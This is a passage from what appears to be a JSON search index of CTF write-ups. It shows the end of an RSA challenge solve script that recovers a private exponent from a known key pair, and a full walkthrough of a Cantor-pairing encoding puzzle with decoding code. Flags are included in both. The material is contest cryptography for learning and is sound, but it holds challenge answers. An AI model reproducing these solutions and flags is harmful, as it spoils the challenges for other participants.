119082667712915497270407702277886743652985638444637188059938681008077058895935345765407160513555112013190751711213523389194925328565164667817570328474785391992857634832562389502866385475392702847788337877472422435555825872297998602400341624700149407637506713864175123267515579305109471947679940924817268027249 c = 107089582154092285354514758987465112016144455480126366962910414293721965682740674205100222823439150990299989680593179350933020427732386716386685052221680274283469481350106415150660410528574034324184318354089504379956162660478769613136499331243363223860893663583161020156316072996007464894397755058410931262938 e_private = 0x10001 phiNxK = e_public * d_public -1 for k in range(1, 1000000): if(phiNxK % k) == 0: Dprivate = pow(e_private, -1, phiNxK//k) m = long_to_bytes(pow(c,Dprivate,N)) try: print(f\u0026#34;mensaje: {(m).decode()}\u0026#34;) except: continue DawgCTF{kn0w1ng_d_1s_kn0w1ng_f4ct0rs}\n"},{"id":4,"href":"/docs/writeups/dawgctf/cantorspairadox/","title":"Cantors Pairadox","section":"Dawg Ctf","content":"Challenge: Now that I have encrypted my flag with a new math function I was just researching I can know share it with my friend Cantor and no one will know how to read it except us!\nFor this we are given 2 files. The first one is a .txt containing the following:\nflag = 4036872197130975885183239290191447112180924008343518098638033545 53589334888434826276681036070738374179472139222629149731482620127084778 4737584016\nAnd the other one is a python file:\nfrom sage.all import sqrt, floor from secret import flag def getTriNumber(n): return n * (n + 1) // 2 # Ensure integer division def pair(n1, n2): S = n1 + n2 return getTriNumber(S) + n2 def pair_array(arr): result = [] for i in range(0, len(arr), 2): result.append(pair(arr[i], arr[i + 1])) return result def pad_to_power_of_two(arr): result = arr n = len(result) while (n \u0026amp; (n - 1)) != 0: result.append(0) n += 1 return result flag = [ord(f) for f in flag] flag = pad_to_power_of_two(flag) temp = flag for i in range(6): temp = pair_array(temp) print(\u0026#34;Encoded:\u0026#34;, temp) Lets start by analizing what it does.\nFirst of all the variable containing the flag is converted to ASCII (example: \u0026ldquo;flag\u0026rdquo;-\u0026gt;[102, 108, 97, 103]) and then pad_to_power_of_two() is called. This function just adds zeros to the right until the length is a power of 2. For example if it was [1,2,3] (length 3) it would convert it to [1,2,3,0] (lenght 4 = 2²).\nflag = [ord(f) for f in flag] flag = pad_to_power_of_two(flag) def pad_to_power_of_two(arr): result = arr n = len(result) while (n \u0026amp; (n - 1)) != 0: result.append(0) n += 1 return result Then the variable is passed into pair_array() 6 times. This function iterates over the temp variable and and passes to the function pair() two consecutive numbers.\ntemp = flag for i in range(6): temp = pair_array(temp) def pair_array(arr): result = [] for i in range(0, len(arr), 2): result.append(pair(arr[i], arr[i + 1])) return result Lets forget about the function pair() and dive deep into pair_array(), if we had this list [2, 4, 5, 7] what pair_array() would do is:\nresult = [] result.append(pair(2, 4)) result.append(pair(5, 7)) So we are converting 2 concatenate numbers into 1 and doing that 6 times. If we were to do it again with our example:\nresult = [] a = pair(2, 4) b = pair(5, 7) result.append(pair(a, b)) Like this we can convert 4 numbers into just one. Now lets look at how that unique number is calculated. First we add both numbers (S = n1 + n2) and we return the triangular number of S + n2.\ndef getTriNumber(n): return n * (n + 1) // 2 # Ensure integer division def pair(n1, n2): S = n1 + n2 return getTriNumber(S) + n2 This is the Cantor pairing function (the statement gives us a hint). So lets take a look at how our list would work with this pairing.\nresult = [] result.append(pair(2, 4)) result.append(pair(5, 7)) print(f\u0026#34;Result: {result}\u0026#34;) -\u0026gt; Result: [25, 85]\nresult = [] result.append(pair(25, 85)) print(f\u0026#34;Result: {result}\u0026#34;) -\u0026gt; Result: [6190]\nAnd that is how we converted 4 numbers -\u0026gt; 2 numbers -\u0026gt; 1 number, iterating 2 times.\nThere is a formula to reverse this pairing and this is how it looks in Python.\nfrom sympy import * def getTriNumber(n): return n * (n + 1) // 2 def unpair(z): w = floor((sqrt(8*z + 1) - 1) / 2) t = getTriNumber(w) n2 = z - t n1 = w - n2 return n1, n2 def unpair_array(arr): result = [] for z in arr: a, b = unpair(z) result.append(a) result.append(b) return result Now with all this we just need to call unpair_array() 6 times with the number we were provided and we will have the flag.\nfrom sympy import * def getTriNumber(n): return n * (n + 1) // 2 def unpair(z): w = floor((sqrt(8*z + 1) - 1) / 2) t = getTriNumber(w) n2 = z - t n1 = w - n2 return n1, n2 def unpair_array(arr): result = [] for z in arr: a, b = unpair(z) result.append(a) result.append(b) return result # Step 1: the number we were given encoded_value = [4036872197130975885183239290191447112180924008343518098638033545535893348884348262766810360707383741794721392226291497314826201270847784737584016] # Step 2: unpair 6 times temp = encoded_value for _ in range(6): temp = unpair_array(temp) # Step 3: to eliminate the zeros that were added when the # length was converted to the power of 2 (this is not neccesary) while temp and temp[-1] == 0: temp.pop() # Step 4: convert to text flag = \u0026#39;\u0026#39;.join(chr(x) for x in temp) print(\u0026#34;Decoded flag:\u0026#34;, flag) Dawg{1_pr3f3r_4ppl3s_t0_pa1rs_4nyw2y5}\n"}]